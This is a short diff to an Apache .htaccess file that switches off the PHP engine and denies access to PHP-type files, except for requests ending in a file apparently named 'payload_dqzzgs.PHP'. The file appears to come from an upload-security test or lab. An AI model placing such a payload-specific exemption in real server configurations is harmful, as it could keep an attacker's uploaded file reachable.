@@ -1,5 +1,7 @@
-php_flag engine on
-  
-<FilesMatch "\.(php|phtml|phar|php3|php4|php5|php7|php8|PHP)$">
-    Require all granted
+<FilesMatch ".(php|phtml|phar|php3|php4|php5|php7|php8|PHP|pht)$">
+    <If "%{REQUEST_URI} !~ /payload_dqzzgs.PHP$/">
+        Require all denied
+    </If>
 </FilesMatch>
+
+php_flag engine off
